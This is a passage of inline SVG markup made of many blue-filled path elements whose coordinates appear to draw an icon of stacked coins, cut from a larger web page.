                      d="M40.6249 71.25C35.5138 71.25 34.0796 69.9632 33.933 69.817C33.6888 69.5726 33.6888 69.1772 33.933 68.9332C34.1736 68.6927 34.5618 68.6889 34.8047 68.9223C34.8535 68.9625 36.1389 70.0001 40.6249 70.0001C45.1793 70.0001 46.4342 68.9309 46.4464 68.9212C46.6979 68.6964 47.0909 68.7038 47.3229 68.9528C47.5548 69.1982 47.5561 69.5778 47.3169 69.8171C47.1704 69.9632 45.7359 71.25 40.6249 71.25Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M40.6249 74.9999C35.5138 74.9999 34.0796 73.7133 33.933 73.5669C33.6888 73.3227 33.6888 72.9271 33.933 72.6831C34.1736 72.4427 34.5618 72.439 34.8047 72.6722C34.8535 72.7125 36.1389 73.7502 40.6249 73.7502C45.1793 73.7502 46.4342 72.6808 46.4464 72.6711C46.6979 72.4465 47.0909 72.4551 47.3229 72.7028C47.5548 72.9481 47.5561 73.3279 47.3169 73.567C47.1704 73.7133 45.7359 74.9999 40.6249 74.9999Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M46.8749 70.0001C46.7199 70.0001 46.5649 69.9427 46.4451 69.8279C46.3963 69.7877 45.111 68.75 40.6249 68.75C36.0705 68.75 34.8156 69.8194 34.8034 69.829C34.5506 70.0537 34.1601 70.0464 33.9269 69.7974C33.6951 69.552 33.6938 69.1724 33.933 68.9332C34.0795 68.7865 35.5138 67.5 40.6249 67.5C45.7359 67.5 47.1704 68.7866 47.3168 68.9332C47.5609 69.1774 47.5609 69.5728 47.3168 69.8169C47.1948 69.9389 47.0347 70.0001 46.8749 70.0001Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M34.3749 73.75C34.0295 73.75 33.7499 73.4705 33.7499 73.125V69.3749C33.7499 69.0295 34.0295 68.75 34.3749 68.75C34.7204 68.75 34.9999 69.0295 34.9999 69.3749V73.125C34.9999 73.4705 34.7204 73.75 34.3749 73.75Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M46.8749 73.75C46.5294 73.75 46.2499 73.4705 46.2499 73.125V69.3749C46.2499 69.0295 46.5294 68.75 46.8749 68.75C47.2203 68.75 47.4999 69.0295 47.4999 69.3749V73.125C47.4999 73.4705 47.2203 73.75 46.8749 73.75Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M40.6249 64.9999C40.2794 64.9999 39.9999 64.7204 39.9999 64.3749V63.125C39.9999 62.7795 40.2794 62.5 40.6249 62.5C40.9704 62.5 41.2499 62.7795 41.2499 63.125V64.3749C41.2499 64.7204 40.9704 64.9999 40.6249 64.9999Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M44.3749 64.6938C44.0295 64.6938 43.75 64.4143 43.75 64.0688V62.836C43.75 62.4904 44.0295 62.2109 44.3749 62.2109C44.7204 62.2109 44.9999 62.4904 44.9999 62.836V64.0688C44.9999 64.4143 44.7204 64.6938 44.3749 64.6938Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M36.8751 64.6816C36.5298 64.6816 36.2501 64.4021 36.2501 64.0565V62.8189C36.2501 62.4734 36.5296 62.1938 36.8751 62.1938C37.2207 62.1938 37.5002 62.4734 37.5002 62.8189V64.0565C37.5 64.4021 37.2205 64.6816 36.8751 64.6816Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M40.6249 62.5C35.5138 62.5 34.0796 61.2134 33.933 61.067C33.6888 60.8226 33.6888 60.4272 33.933 60.1832C34.1736 59.9427 34.5618 59.9389 34.8047 60.1723C34.8535 60.2125 36.1389 61.2503 40.6249 61.2503C45.1793 61.2503 46.4342 60.1809 46.4464 60.1712C46.6979 59.9464 47.0909 59.9538 47.3229 60.2028C47.5548 60.4482 47.5561 60.8278 47.3169 61.0671C47.1704 61.2134 45.7359 62.5 40.6249 62.5Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M40.6249 66.25C35.5138 66.25 34.0796 64.9632 33.933 64.8168C33.6888 64.5727 33.6888 64.1773 33.933 63.9331C34.1736 63.6927 34.5618 63.689 34.8047 63.9222C34.8535 63.9625 36.1389 65.0002 40.6249 65.0002C45.1793 65.0002 46.4342 63.9308 46.4464 63.9211C46.6979 63.6977 47.0909 63.7051 47.3229 63.9528C47.5548 64.1982 47.5561 64.5778 47.3169 64.817C47.1704 64.9634 45.7359 66.25 40.6249 66.25Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M46.8749 61.2502C46.7199 61.2502 46.5649 61.1928 46.4451 61.078C46.3963 61.0377 45.111 60 40.6249 60C36.0705 60 34.8156 61.0694 34.8034 61.079C34.5506 61.3037 34.1601 61.2964 33.9269 61.0474C33.6951 60.802 33.6938 60.4223 33.933 60.1832C34.0795 60.0366 35.5138 58.75 40.6249 58.75C45.7359 58.75 47.1704 60.0368 47.3168 60.1832C47.5609 60.4274 47.5609 60.8228 47.3168 61.0669C47.1948 61.1892 47.0347 61.2502 46.8749 61.2502Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M34.3749 65C34.0295 65 33.7499 64.7205 33.7499 64.375V60.625C33.7499 60.2795 34.0295 60 34.3749 60C34.7204 60 34.9999 60.2795 34.9999 60.625V64.375C34.9999 64.7205 34.7204 65 34.3749 65Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M46.8749 65C46.5294 65 46.2499 64.7205 46.2499 64.375V60.625C46.2499 60.2795 46.5294 60 46.8749 60C47.2203 60 47.4999 60.2795 47.4999 60.625V64.375C47.4999 64.7205 47.2203 65 46.8749 65Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M40.6249 56.2499C40.2794 56.2499 39.9999 55.9704 39.9999 55.6251V54.375C39.9999 54.0295 40.2794 53.75 40.6249 53.75C40.9704 53.75 41.2499 54.0295 41.2499 54.375V55.6251C41.2499 55.9703 40.9704 56.2499 40.6249 56.2499Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M44.3749 55.944C44.0295 55.944 43.75 55.6643 43.75 55.3189V54.086C43.75 53.7404 44.0295 53.4609 44.3749 53.4609C44.7204 53.4609 44.9999 53.7404 44.9999 54.086V55.3189C44.9999 55.6641 44.7204 55.944 44.3749 55.944Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M36.8751 55.9317C36.5298 55.9317 36.2501 55.6522 36.2501 55.3067V54.0689C36.2501 53.7234 36.5296 53.4438 36.8751 53.4438C37.2207 53.4438 37.5002 53.7234 37.5002 54.0689V55.3067C37.5 55.6522 37.2205 55.9317 36.8751 55.9317Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M40.6249 53.7499C35.5138 53.7499 34.0796 52.4632 33.933 52.3168C33.6888 52.0727 33.6888 51.6771 33.933 51.4331C34.1736 51.1927 34.5618 51.189 34.8047 51.4222C34.8535 51.4625 36.1389 52.5002 40.6249 52.5002C45.1793 52.5002 46.4342 51.4308 46.4464 51.4211C46.6979 51.1965 47.0909 51.2051 47.3229 51.4528C47.5548 51.6981 47.5561 52.0778 47.3169 52.317C47.1704 52.4634 45.7359 53.7499 40.6249 53.7499Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M40.6249 57.5C35.5138 57.5 34.0796 56.2134 33.933 56.0668C33.6888 55.8227 33.6888 55.4273 33.933 55.1831C34.1736 54.9427 34.5618 54.9389 34.8047 55.1723C34.8535 55.2125 36.1389 56.2501 40.6249 56.2501C45.1793 56.2501 46.4342 55.1808 46.4464 55.1712C46.6979 54.9477 47.0909 54.9551 47.3229 55.2028C47.5548 55.4482 47.5561 55.8278 47.3169 56.067C47.1704 56.2134 45.7359 57.5 40.6249 57.5Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M46.8749 52.5001C46.7199 52.5001 46.5649 52.4427 46.4451 52.3279C46.3963 52.2875 45.111 51.2499 40.6249 51.2499C36.0705 51.2499 34.8156 52.3193 34.8034 52.3289C34.5506 52.5536 34.1601 52.545 33.9269 52.2972C33.6951 52.0519 33.6938 51.6722 33.933 51.433C34.0795 51.2865 35.5138 50 40.6249 50C45.7359 50 47.1704 51.2866 47.3168 51.433C47.5609 51.6772 47.5609 52.0727 47.3168 52.3167C47.1948 52.4389 47.0347 52.5001 46.8749 52.5001Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M34.3749 56.25C34.0295 56.25 33.7499 55.9705 33.7499 55.6251V51.875C33.7499 51.5295 34.0295 51.25 34.3749 51.25C34.7204 51.25 34.9999 51.5295 34.9999 51.875V55.6251C34.9999 55.9703 34.7204 56.25 34.3749 56.25Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M46.8749 56.25C46.5294 56.25 46.2499 55.9705 46.2499 55.6251V51.875C46.2499 51.5295 46.5294 51.25 46.8749 51.25C47.2203 51.25 47.4999 51.5295 47.4999 51.875V55.6251C47.4999 55.9703 47.2203 56.25 46.8749 56.25Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M56.8749 73.7499C56.5294 73.7499 56.2499 73.4704 56.2499 73.1249V71.875C56.2499 71.5295 56.5294 71.25 56.8749 71.25C57.2204 71.25 57.4999 71.5295 57.4999 71.875V73.1249C57.4999 73.4704 57.2204 73.7499 56.8749 73.7499Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M60.6247 73.4438C60.2794 73.4438 59.9999 73.1643 59.9999 72.8188V71.586C59.9999 71.2404 60.2794 70.9609 60.6247 70.9609C60.9703 70.9609 61.2498 71.2404 61.2498 71.586V72.8188C61.2498 73.1643 60.9703 73.4438 60.6247 73.4438Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M53.1247 73.4316C52.7794 73.4316 52.4999 73.1521 52.4999 72.8066V71.5689C52.4999 71.2234 52.7794 70.9438 53.1247 70.9438C53.4703 70.9438 53.7498 71.2234 53.7498 71.5689V72.8066C53.7498 73.1521 53.4703 73.4316 53.1247 73.4316Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M56.875 71.25C51.7638 71.25 50.3295 69.9632 50.1831 69.817C49.939 69.5726 49.939 69.1772 50.1831 68.9332C50.4237 68.6927 50.8119 68.6889 51.0546 68.9223C51.1034 68.9625 52.3888 70.0001 56.875 70.0001C61.4294 70.0001 62.6843 68.9309 62.6965 68.9212C62.948 68.6964 63.3411 68.7038 63.573 68.9528C63.805 69.1982 63.8062 69.5778 63.5669 69.8171C63.4204 69.9632 61.9859 71.25 56.875 71.25Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M56.875 74.9999C51.7638 74.9999 50.3295 73.7133 50.1831 73.5669C49.939 73.3227 49.939 72.9271 50.1831 72.6831C50.4237 72.4427 50.8119 72.439 51.0546 72.6722C51.1034 72.7125 52.3888 73.7502 56.875 73.7502C61.4294 73.7502 62.6843 72.6808 62.6965 72.6711C62.948 72.4465 63.3411 72.4551 63.573 72.7028C63.805 72.9481 63.8062 73.3279 63.5669 73.567C63.4204 73.7133 61.9859 74.9999 56.875 74.9999Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M63.1249 70.0001C62.9698 70.0001 62.8149 69.9427 62.6951 69.8279C62.6463 69.7877 61.3611 68.75 56.8749 68.75C52.3205 68.75 51.0655 69.8194 51.0533 69.829C50.8007 70.0537 50.4089 70.0464 50.1767 69.7974C49.9449 69.552 49.9437 69.1724 50.1828 68.9332C50.3294 68.7865 51.7635 67.5 56.8747 67.5C61.9858 67.5 63.4202 68.7866 63.5665 68.9332C63.8108 69.1774 63.8108 69.5728 63.5665 69.8169C63.4446 69.9389 63.2846 70.0001 63.1249 70.0001Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M50.6249 73.75C50.2794 73.75 49.9999 73.4705 49.9999 73.125V69.3749C49.9999 69.0295 50.2794 68.75 50.6249 68.75C50.9704 68.75 51.2499 69.0295 51.2499 69.3749V73.125C51.2499 73.4705 50.9704 73.75 50.6249 73.75Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M63.1249 73.75C62.7794 73.75 62.4999 73.4705 62.4999 73.125V69.3749C62.4999 69.0295 62.7794 68.75 63.1249 68.75C63.4703 68.75 63.7498 69.0295 63.7498 69.3749V73.125C63.7498 73.4705 63.4703 73.75 63.1249 73.75Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M56.8749 64.9999C56.5294 64.9999 56.2499 64.7204 56.2499 64.3749V63.125C56.2499 62.7795 56.5294 62.5 56.8749 62.5C57.2204 62.5 57.4999 62.7795 57.4999 63.125V64.3749C57.4999 64.7204 57.2204 64.9999 56.8749 64.9999Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M60.6247 64.6938C60.2794 64.6938 59.9999 64.4143 59.9999 64.0688V62.836C59.9999 62.4904 60.2794 62.2109 60.6247 62.2109C60.9703 62.2109 61.2498 62.4904 61.2498 62.836V64.0688C61.2498 64.4143 60.9703 64.6938 60.6247 64.6938Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M53.1247 64.6816C52.7794 64.6816 52.4999 64.4021 52.4999 64.0565V62.8189C52.4999 62.4734 52.7794 62.1938 53.1247 62.1938C53.4703 62.1938 53.7498 62.4734 53.7498 62.8189V64.0565C53.7498 64.4021 53.4703 64.6816 53.1247 64.6816Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M56.875 62.5C51.7638 62.5 50.3295 61.2134 50.1831 61.067C49.939 60.8226 49.939 60.4272 50.1831 60.1832C50.4237 59.9427 50.8119 59.9389 51.0546 60.1723C51.1034 60.2125 52.3888 61.2503 56.875 61.2503C61.4294 61.2503 62.6843 60.1809 62.6965 60.1712C62.948 59.9464 63.3411 59.9538 63.573 60.2028C63.805 60.4482 63.8062 60.8278 63.5669 61.0671C63.4204 61.2134 61.9859 62.5 56.875 62.5Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M56.875 66.25C51.7638 66.25 50.3295 64.9632 50.1831 64.8168C49.939 64.5727 49.939 64.1773 50.1831 63.9331C50.4237 63.6927 50.8119 63.689 51.0546 63.9222C51.1034 63.9625 52.3888 65.0002 56.875 65.0002C61.4294 65.0002 62.6843 63.9308 62.6965 63.9211C62.948 63.6977 63.3411 63.7051 63.573 63.9528C63.805 64.1982 63.8062 64.5778 63.5669 64.817C63.4204 64.9634 61.9859 66.25 56.875 66.25Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M63.1249 61.2502C62.9698 61.2502 62.8149 61.1928 62.6951 61.078C62.6463 61.0377 61.3611 60 56.8749 60C52.3205 60 51.0655 61.0694 51.0533 61.079C50.8007 61.3037 50.4089 61.2964 50.1767 61.0474C49.9449 60.802 49.9437 60.4223 50.1828 60.1832C50.3294 60.0366 51.7635 58.75 56.8747 58.75C61.9858 58.75 63.4202 60.0368 63.5665 60.1832C63.8108 60.4274 63.8108 60.8228 63.5665 61.0669C63.4446 61.1892 63.2846 61.2502 63.1249 61.2502Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M50.6249 65C50.2794 65 49.9999 64.7205 49.9999 64.375V60.625C49.9999 60.2795 50.2794 60 50.6249 60C50.9704 60 51.2499 60.2795 51.2499 60.625V64.375C51.2499 64.7205 50.9704 65 50.6249 65Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M63.1249 65C62.7794 65 62.4999 64.7205 62.4999 64.375V60.625C62.4999 60.2795 62.7794 60 63.1249 60C63.4703 60 63.7498 60.2795 63.7498 60.625V64.375C63.7498 64.7205 63.4703 65 63.1249 65Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M56.8749 56.2499C56.5294 56.2499 56.2499 55.9704 56.2499 55.6251V54.375C56.2499 54.0295 56.5294 53.75 56.8749 53.75C57.2204 53.75 57.4999 54.0295 57.4999 54.375V55.6251C57.4999 55.9703 57.2204 56.2499 56.8749 56.2499Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M60.6247 55.944C60.2794 55.944 59.9999 55.6643 59.9999 55.3189V54.086C59.9999 53.7404 60.2794 53.4609 60.6247 53.4609C60.9703 53.4609 61.2498 53.7404 61.2498 54.086V55.3189C61.2498 55.6641 60.9703 55.944 60.6247 55.944Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M53.1247 55.9317C52.7794 55.9317 52.4999 55.6522 52.4999 55.3067V54.0689C52.4999 53.7234 52.7794 53.4438 53.1247 53.4438C53.4703 53.4438 53.7498 53.7234 53.7498 54.0689V55.3067C53.7498 55.6522 53.4703 55.9317 53.1247 55.9317Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M56.875 53.7499C51.7638 53.7499 50.3295 52.4632 50.1831 52.3168C49.939 52.0727 49.939 51.6771 50.1831 51.4331C50.4237 51.1927 50.8119 51.189 51.0546 51.4222C51.1034 51.4625 52.3888 52.5002 56.875 52.5002C61.4294 52.5002 62.6843 51.4308 62.6965 51.4211C62.948 51.1965 63.3411 51.2051 63.573 51.4528C63.805 51.6981 63.8062 52.0778 63.5669 52.317C63.4204 52.4634 61.9859 53.7499 56.875 53.7499Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M56.875 57.5C51.7638 57.5 50.3295 56.2134 50.1831 56.0668C49.939 55.8227 49.939 55.4273 50.1831 55.1831C50.4237 54.9427 50.8119 54.9389 51.0546 55.1723C51.1034 55.2125 52.3888 56.2501 56.875 56.2501C61.4294 56.2501 62.6843 55.1808 62.6965 55.1712C62.948 54.9477 63.3411 54.9551 63.573 55.2028C63.805 55.4482 63.8062 55.8278 63.5669 56.067C63.4204 56.2134 61.9859 57.5 56.875 57.5Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M63.1249 52.5001C62.9698 52.5001 62.8149 52.4427 62.6951 52.3279C62.6463 52.2875 61.3611 51.2499 56.8749 51.2499C52.3205 51.2499 51.0655 52.3193 51.0533 52.3289C50.8007 52.5536 50.4089 52.545 50.1767 52.2972C49.9449 52.0519 49.9437 51.6722 50.1828 51.433C50.3294 51.2865 51.7635 50 56.8747 50C61.9858 50 63.4202 51.2866 63.5665 51.433C63.8108 51.6772 63.8108 52.0727 63.5665 52.3167C63.4446 52.4389 63.2846 52.5001 63.1249 52.5001Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M50.6249 56.25C50.2794 56.25 49.9999 55.9705 49.9999 55.6251V51.875C49.9999 51.5295 50.2794 51.25 50.6249 51.25C50.9704 51.25 51.2499 51.5295 51.2499 51.875V55.6251C51.2499 55.9703 50.9704 56.25 50.6249 56.25Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M63.1249 56.25C62.7794 56.25 62.4999 55.9705 62.4999 55.6251V51.875C62.4999 51.5295 62.7794 51.25 63.1249 51.25C63.4703 51.25 63.7498 51.5295 63.7498 51.875V55.6251C63.7498 55.9703 63.4703 56.25 63.1249 56.25Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M56.8749 47.4999C56.5294 47.4999 56.2499 47.2203 56.2499 46.8749V45.6249C56.2499 45.2795 56.5294 45 56.8749 45C57.2204 45 57.4999 45.2795 57.4999 45.6249V46.8749C57.4999 47.2203 57.2204 47.4999 56.8749 47.4999Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M60.6247 47.1938C60.2794 47.1938 59.9999 46.9141 59.9999 46.5688V45.3358C59.9999 44.9904 60.2794 44.7109 60.6247 44.7109C60.9703 44.7109 61.2498 44.9904 61.2498 45.3358V46.5688C61.2498 46.9141 60.9703 47.1938 60.6247 47.1938Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M53.1247 47.1816C52.7794 47.1816 52.4999 46.9021 52.4999 46.5565V45.3189C52.4999 44.9734 52.7794 44.6938 53.1247 44.6938C53.4703 44.6938 53.7498 44.9734 53.7498 45.3189V46.5565C53.7498 46.9021 53.4703 47.1816 53.1247 47.1816Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M56.875 45C51.7638 45 50.3295 43.7132 50.1831 43.5668C49.939 43.3227 49.939 42.9273 50.1831 42.6831C50.4237 42.4427 50.8119 42.439 51.0546 42.6722C51.1034 42.7125 52.3888 43.7502 56.875 43.7502C61.4294 43.7502 62.6843 42.6808 62.6965 42.6711C62.948 42.4465 63.3411 42.4551 63.573 42.7028C63.805 42.9482 63.8062 43.3278 63.5669 43.567C63.4204 43.7132 61.9859 45 56.875 45Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M56.875 48.7499C51.7638 48.7499 50.3295 47.4632 50.1831 47.3168C49.939 47.0727 49.939 46.6771 50.1831 46.4331C50.4237 46.1927 50.8119 46.189 51.0546 46.4222C51.1034 46.4625 52.3888 47.5002 56.875 47.5002C61.4294 47.5002 62.6843 46.4308 62.6965 46.4211C62.948 46.1977 63.3411 46.2051 63.573 46.4528C63.805 46.6981 63.8062 47.0778 63.5669 47.317C63.4204 47.4634 61.9859 48.7499 56.875 48.7499Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M63.1249 43.7501C62.9698 43.7501 62.8149 43.6927 62.6951 43.5779C62.6463 43.5377 61.3611 42.4999 56.8749 42.4999C52.3205 42.4999 51.0655 43.5693 51.0533 43.579C50.8007 43.8037 50.4089 43.7951 50.1767 43.5474C49.9449 43.302 49.9437 42.9224 50.1828 42.683C50.3294 42.5365 51.7635 41.25 56.8747 41.25C61.9858 41.25 63.4202 42.5366 63.5665 42.683C63.8108 42.9274 63.8108 43.3228 63.5665 43.5668C63.4446 43.6889 63.2846 43.7501 63.1249 43.7501Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M50.6249 47.5002C50.2794 47.5002 49.9999 47.2205 49.9999 46.8751V43.125C49.9999 42.7797 50.2794 42.5 50.6249 42.5C50.9704 42.5 51.2499 42.7797 51.2499 43.125V46.8751C51.2499 47.2205 50.9704 47.5002 50.6249 47.5002Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M63.1249 47.5002C62.7794 47.5002 62.4999 47.2205 62.4999 46.8751V43.125C62.4999 42.7797 62.7794 42.5 63.1249 42.5C63.4703 42.5 63.7498 42.7797 63.7498 43.125V46.8751C63.7498 47.2205 63.4703 47.5002 63.1249 47.5002Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M73.1248 73.7499C72.7793 73.7499 72.4998 73.4704 72.4998 73.1249V71.875C72.4998 71.5295 72.7793 71.25 73.1248 71.25C73.4703 71.25 73.7498 71.5295 73.7498 71.875V73.1249C73.7498 73.4704 73.4703 73.7499 73.1248 73.7499Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M76.8748 73.4438C76.5294 73.4438 76.2498 73.1643 76.2498 72.8188V71.586C76.2498 71.2404 76.5294 70.9609 76.8748 70.9609C77.2203 70.9609 77.4998 71.2404 77.4998 71.586V72.8188C77.4998 73.1643 77.2203 73.4438 76.8748 73.4438Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M69.3749 73.4316C69.0295 73.4316 68.75 73.1521 68.75 72.8066V71.5689C68.75 71.2234 69.0295 70.9438 69.3749 70.9438C69.7204 70.9438 69.9999 71.2234 69.9999 71.5689V72.8066C69.9999 73.1521 69.7204 73.4316 69.3749 73.4316Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M73.1248 71.25C68.0136 71.25 66.5793 69.9632 66.4329 69.817C66.1887 69.5726 66.1887 69.1772 66.4329 68.9332C66.6734 68.6927 67.0616 68.6889 67.3044 68.9223C67.3532 68.9625 68.6386 70.0001 73.1248 70.0001C77.6792 70.0001 78.934 68.9309 78.9462 68.9212C79.1976 68.6964 79.5908 68.7038 79.8228 68.9528C80.0547 69.1982 80.056 69.5778 79.8167 69.8171C79.6703 69.9632 78.2358 71.25 73.1248 71.25Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M73.1248 74.9999C68.0136 74.9999 66.5793 73.7133 66.4329 73.5669C66.1887 73.3227 66.1887 72.9271 66.4329 72.6831C66.6734 72.4427 67.0616 72.439 67.3044 72.6722C67.3532 72.7125 68.6386 73.7502 73.1248 73.7502C77.6792 73.7502 78.934 72.6808 78.9462 72.6711C79.1976 72.4465 79.5908 72.4551 79.8228 72.7028C80.0547 72.9481 80.056 73.3279 79.8167 73.567C79.6703 73.7133 78.2358 74.9999 73.1248 74.9999Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M79.3748 70.0001C79.2196 70.0001 79.0648 69.9427 78.945 69.8279C78.8962 69.7877 77.6108 68.75 73.1248 68.75C68.5702 68.75 67.3153 69.8194 67.3031 69.829C67.0505 70.0537 66.66 70.0464 66.4266 69.7974C66.1948 69.552 66.1936 69.1724 66.4327 68.9332C66.5793 68.7865 68.0134 67.5 73.1246 67.5C78.2357 67.5 79.6701 68.7866 79.8164 68.9332C80.0607 69.1774 80.0607 69.5728 79.8164 69.8169C79.6945 69.9389 79.5347 70.0001 79.3748 70.0001Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M66.8748 73.75C66.5293 73.75 66.2498 73.4705 66.2498 73.125V69.3749C66.2498 69.0295 66.5293 68.75 66.8748 68.75C67.2203 68.75 67.4998 69.0295 67.4998 69.3749V73.125C67.4998 73.4705 67.2203 73.75 66.8748 73.75Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M79.3748 73.75C79.0293 73.75 78.7498 73.4705 78.7498 73.125V69.3749C78.7498 69.0295 79.0293 68.75 79.3748 68.75C79.7201 68.75 79.9996 69.0295 79.9996 69.3749V73.125C79.9996 73.4705 79.7201 73.75 79.3748 73.75Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M73.1248 64.9999C72.7793 64.9999 72.4998 64.7204 72.4998 64.3749V63.125C72.4998 62.7795 72.7793 62.5 73.1248 62.5C73.4703 62.5 73.7498 62.7795 73.7498 63.125V64.3749C73.7498 64.7204 73.4703 64.9999 73.1248 64.9999Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M76.8748 64.6938C76.5294 64.6938 76.2498 64.4143 76.2498 64.0688V62.836C76.2498 62.4904 76.5294 62.2109 76.8748 62.2109C77.2203 62.2109 77.4998 62.4904 77.4998 62.836V64.0688C77.4998 64.4143 77.2203 64.6938 76.8748 64.6938Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M69.3749 64.6816C69.0295 64.6816 68.75 64.4021 68.75 64.0565V62.8189C68.75 62.4734 69.0295 62.1938 69.3749 62.1938C69.7204 62.1938 69.9999 62.4734 69.9999 62.8189V64.0565C69.9999 64.4021 69.7204 64.6816 69.3749 64.6816Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M73.1248 62.5C68.0136 62.5 66.5793 61.2134 66.4329 61.067C66.1887 60.8226 66.1887 60.4272 66.4329 60.1832C66.6734 59.9427 67.0616 59.9389 67.3044 60.1723C67.3532 60.2125 68.6386 61.2503 73.1248 61.2503C77.6792 61.2503 78.934 60.1809 78.9462 60.1712C79.1976 59.9464 79.5908 59.9538 79.8228 60.2028C80.0547 60.4482 80.056 60.8278 79.8167 61.0671C79.6703 61.2134 78.2358 62.5 73.1248 62.5Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M73.1248 66.25C68.0136 66.25 66.5793 64.9632 66.4329 64.8168C66.1887 64.5727 66.1887 64.1773 66.4329 63.9331C66.6734 63.6927 67.0616 63.689 67.3044 63.9222C67.3532 63.9625 68.6386 65.0002 73.1248 65.0002C77.6792 65.0002 78.934 63.9308 78.9462 63.9211C79.1976 63.6977 79.5908 63.7051 79.8228 63.9528C80.0547 64.1982 80.056 64.5778 79.8167 64.817C79.6703 64.9634 78.2358 66.25 73.1248 66.25Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M79.3748 61.2502C79.2196 61.2502 79.0648 61.1928 78.945 61.078C78.8962 61.0377 77.6108 60 73.1248 60C68.5702 60 67.3153 61.0694 67.3031 61.079C67.0505 61.3037 66.66 61.2964 66.4266 61.0474C66.1948 60.802 66.1936 60.4223 66.4327 60.1832C66.5793 60.0366 68.0134 58.75 73.1246 58.75C78.2357 58.75 79.6701 60.0368 79.8164 60.1832C80.0607 60.4274 80.0607 60.8228 79.8164 61.0669C79.6945 61.1892 79.5347 61.2502 79.3748 61.2502Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M66.8748 65C66.5293 65 66.2498 64.7205 66.2498 64.375V60.625C66.2498 60.2795 66.5293 60 66.8748 60C67.2203 60 67.4998 60.2795 67.4998 60.625V64.375C67.4998 64.7205 67.2203 65 66.8748 65Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M79.3748 65C79.0293 65 78.7498 64.7205 78.7498 64.375V60.625C78.7498 60.2795 79.0293 60 79.3748 60C79.7201 60 79.9996 60.2795 79.9996 60.625V64.375C79.9996 64.7205 79.7201 65 79.3748 65Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M73.1248 56.2499C72.7793 56.2499 72.4998 55.9704 72.4998 55.6251V54.375C72.4998 54.0295 72.7793 53.75 73.1248 53.75C73.4703 53.75 73.7498 54.0295 73.7498 54.375V55.6251C73.7498 55.9703 73.4703 56.2499 73.1248 56.2499Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M76.8748 55.944C76.5294 55.944 76.2498 55.6643 76.2498 55.3189V54.086C76.2498 53.7404 76.5294 53.4609 76.8748 53.4609C77.2203 53.4609 77.4998 53.7404 77.4998 54.086V55.3189C77.4998 55.6641 77.2203 55.944 76.8748 55.944Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M69.3749 55.9317C69.0295 55.9317 68.75 55.6522 68.75 55.3067V54.0689C68.75 53.7234 69.0295 53.4438 69.3749 53.4438C69.7204 53.4438 69.9999 53.7234 69.9999 54.0689V55.3067C69.9999 55.6522 69.7204 55.9317 69.3749 55.9317Z"
                      fill="#116FFF"
                    ></path>
